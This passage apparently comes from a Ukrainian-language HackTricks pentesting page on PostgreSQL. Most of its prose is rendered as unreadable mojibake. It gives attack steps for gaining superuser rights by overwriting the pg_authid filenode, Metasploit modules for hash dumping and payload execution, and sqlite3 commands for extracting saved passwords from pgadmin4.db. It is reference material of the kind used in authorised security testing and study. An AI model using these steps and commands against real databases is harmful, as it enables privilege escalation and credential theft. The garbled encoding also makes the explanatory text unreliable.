–ù–∞—Å—Ç—É–ø–Ω–∏–π –≤–µ–∫—Ç–æ—Ä –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –æ—Å–æ–±–ª–∏–≤–æ –∫–æ—Ä–∏—Å–Ω–∏–π –≤ –æ–±–º–µ–∂–µ–Ω–∏—Ö –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞—Ö SQLi, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—Å—ñ –∫—Ä–æ–∫–∏ –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ —á–µ—Ä–µ–∑ –≤–∫–ª–∞–¥–µ–Ω—ñ –æ–ø–µ—Ä–∞—Ç–æ—Ä–∏ SELECT
{% endhint %}

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **—á–∏—Ç–∞—Ç–∏ —Ç–∞ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏ —Å–µ—Ä–≤–µ—Ä–∞ PostgreSQL**, –≤–∏ –º–æ–∂–µ—Ç–µ **—Å—Ç–∞—Ç–∏ —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º**, –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–≤—à–∏ —Ñ—ñ–ª–µ–Ω–æ–¥ PostgreSQL –Ω–∞ –¥–∏—Å–∫—É, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—é —Ç–∞–±–ª–∏—Ü–µ—é `pg_authid`.

–î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ **—Ü–µ–π –º–µ—Ç–æ–¥** [**—Ç—É—Ç**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

–ö—Ä–æ–∫–∏ –∞—Ç–∞–∫–∏:

1. –û—Ç—Ä–∏–º–∞–π—Ç–µ –∫–∞—Ç–∞–ª–æ–≥ –¥–∞–Ω–∏—Ö PostgreSQL
2. –û—Ç—Ä–∏–º–∞–π—Ç–µ –≤—ñ–¥–Ω–æ—Å–Ω–∏–π —à–ª—è—Ö –¥–æ —Ñ—ñ–ª–µ–Ω–æ–¥—É, –ø–æ–≤'—è–∑–∞–Ω–æ–≥–æ –∑ —Ç–∞–±–ª–∏—Ü–µ—é `pg_authid`
3. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ —Ñ—ñ–ª–µ–Ω–æ–¥ —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—ó `lo_*`
4. –û—Ç—Ä–∏–º–∞–π—Ç–µ —Ç–∏–ø –¥–∞–Ω–∏—Ö, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ —Ç–∞–±–ª–∏—Ü–µ—é `pg_authid`
5. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [–†–µ–¥–∞–∫—Ç–æ—Ä —Ñ—ñ–ª–µ–Ω–æ–¥—É PostgreSQL](https://github.com/adeadfed/postgresql-filenode-editor), —â–æ–± [—Ä–µ–¥–∞–≥—É–≤–∞—Ç–∏ —Ñ—ñ–ª–µ–Ω–æ–¥](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg\_authid-table); –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –≤—Å—ñ –±—É–ª–µ–≤—ñ –ø—Ä–∞–ø–æ—Ä–∏ `rol*` –Ω–∞ 1 –¥–ª—è –ø–æ–≤–Ω–∏—Ö –¥–æ–∑–≤–æ–ª—ñ–≤.
6. –ü–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –≤—ñ–¥—Ä–µ–¥–∞–≥–æ–≤–∞–Ω–∏–π —Ñ—ñ–ª–µ–Ω–æ–¥ —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—ó `lo_*`, —Ç–∞ –ø–µ—Ä–µ–∑–∞–ø–∏—à—ñ—Ç—å –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π —Ñ–∞–π–ª –Ω–∞ –¥–∏—Å–∫—É
7. _(–ù–µ–æ–±–æ–≤'—è–∑–∫–æ–≤–æ)_ –û—á–∏—Å—Ç—ñ—Ç—å –∫–µ—à —Ç–∞–±–ª–∏—Ü—ñ –≤ –ø–∞–º'—è—Ç—ñ, –∑–∞–ø—É—Å—Ç–∏–≤—à–∏ –¥–æ—Ä–æ–≥–∏–π SQL-–∑–∞–ø–∏—Ç
8. –¢–µ–ø–µ—Ä –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –º–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –ø–æ–≤–Ω–æ–≥–æ —Å—É–ø–µ—Ä–∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### –ª–æ–≥—É–≤–∞–Ω–Ω—è

–£ —Ñ–∞–π–ª—ñ _**postgresql.conf**_ –≤–∏ –º–æ–∂–µ—Ç–µ —É–≤—ñ–º–∫–Ω—É—Ç–∏ –ª–æ–≥–∏ postgresql, –∑–º—ñ–Ω–∏–≤—à–∏:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
–ü–æ—Ç—ñ–º **–ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç—ñ—Ç—å —Å–µ—Ä–≤—ñ—Å**.

### pgadmin

[pgadmin](https://www.pgadmin.org) - —Ü–µ –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä—É–≤–∞–Ω–Ω—è —Ç–∞ —Ä–æ–∑—Ä–æ–±–∫–∏ –¥–ª—è PostgreSQL.\
–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **–ø–∞—Ä–æ–ª—ñ** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É _**pgadmin4.db**_\
–í–∏ –º–æ–∂–µ—Ç–µ —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ —ó—Ö, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ñ—É–Ω–∫—Ü—ñ—é _**decrypt**_ —É —Å–∫—Ä–∏–ø—Ç—ñ: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

–ö–ª—ñ—î–Ω—Ç—Å—å–∫–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –≤ PostgreSQL –∫–µ—Ä—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ —Ñ–∞–π–ª –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –ø—ñ–¥ –Ω–∞–∑–≤–æ—é **pg\_hba.conf**. –¶–µ–π —Ñ–∞–π–ª –º—ñ—Å—Ç–∏—Ç—å —Å–µ—Ä—ñ—é –∑–∞–ø–∏—Å—ñ–≤, –∫–æ–∂–µ–Ω –∑ —è–∫–∏—Ö –≤–∫–∞–∑—É—î —Ç–∏–ø –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è, –¥—ñ–∞–ø–∞–∑–æ–Ω IP-–∞–¥—Ä–µ—Å –∫–ª—ñ—î–Ω—Ç–∞ (—è–∫—â–æ —Ü–µ –∑–∞—Å—Ç–æ—Å–æ–≤–Ω–æ), –Ω–∞–∑–≤—É –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –º–µ—Ç–æ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–ª—è –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—Å—Ç—ñ –ø—ñ–¥–∫–ª—é—á–µ–Ω—å. –ü–µ—Ä—à–∏–π –∑–∞–ø–∏—Å, —è–∫–∏–π –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î —Ç–∏–ø—É –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è, IP-–∞–¥—Ä–µ—Å—ñ –∫–ª—ñ—î–Ω—Ç–∞, –∑–∞–ø–∏—Ç–∞–Ω—ñ–π –±–∞–∑—ñ –¥–∞–Ω–∏—Ö —Ç–∞ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –Ø–∫—â–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –Ω–µ –≤–¥–∞—î—Ç—å—Å—è, —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ –≤–∞—Ä—ñ–∞–Ω—Ç—É –∞–±–æ —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ –∫–æ–ø—ñ—é–≤–∞–Ω–Ω—è –Ω–µ–º–∞—î. –Ø–∫—â–æ –∂–æ–¥–µ–Ω –∑–∞–ø–∏—Å –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î, –¥–æ—Å—Ç—É–ø –∑–∞–±–æ—Ä–æ–Ω–µ–Ω–æ.

–î–æ—Å—Ç—É–ø–Ω—ñ –º–µ—Ç–æ–¥–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–∞—Ä–æ–ª—è –≤ pg\_hba.conf: **md5**, **crypt** —Ç–∞ **password**. –¶—ñ –º–µ—Ç–æ–¥–∏ –≤—ñ–¥—Ä—ñ–∑–Ω—è—é—Ç—å—Å—è —Å–ø–æ—Å–æ–±–æ–º –ø–µ—Ä–µ–¥–∞—á—ñ –ø–∞—Ä–æ–ª—è: –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π MD5, –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π crypt –∞–±–æ —á–∏—Å—Ç–∏–π —Ç–µ–∫—Å—Ç. –í–∞–∂–ª–∏–≤–æ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ –º–µ—Ç–æ–¥ crypt –Ω–µ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –∑ –ø–∞—Ä–æ–ª—è–º–∏, —è–∫—ñ –±—É–ª–∏ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –≤ pg\_authid.

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) –¥–ª—è –ª–µ–≥–∫–æ—ó –ø–æ–±—É–¥–æ–≤–∏ —Ç–∞ **–∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó —Ä–æ–±–æ—á–∏—Ö –ø—Ä–æ—Ü–µ—Å—ñ–≤** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞–π–±—ñ–ª—å—à **–ø—Ä–æ–¥–≤–∏–Ω—É—Ç–∏—Ö** —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ —Å–ø—ñ–ª—å–Ω–æ—Ç–∏ —É —Å–≤—ñ—Ç—ñ.\
–û—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ—Å—Ç—É–ø —Å—å–æ–≥–æ–¥–Ω—ñ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
